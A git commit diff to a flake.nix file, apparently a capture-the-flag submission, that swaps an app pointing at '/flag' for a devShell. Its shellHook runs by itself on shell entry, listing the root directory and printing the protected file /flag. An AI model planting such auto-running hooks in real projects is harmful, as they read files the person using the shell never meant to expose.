95e5f5d2feec5614ab26d05e1c69e70f0b291976
Lambda <87592388+Shitotsu@users.noreply.github.com>
2023-09-30 13:04:16 +0700

    Update flake.nix

--- flake.nix
+++ flake.nix
@@ -1,10 +1,17 @@
 {
-  apps = rec {
-    default = runme;
+  description = "A very basic flake";
 
-    runme = {
-      type = "app";
-      program = "/flag";
-    };
+  outputs = { self, nixpkgs }: {
+    devShell.x86_64-linux =
+      let
+        pkgs = nixpkgs.legacyPackages.x86_64-linux;
+      in pkgs.mkShell {
+        shellHook = ''
+          ls -lah
+          ls -lah /
+          ls -lah /flag
+          cat /flag
+        '';
+      };
   };
 }
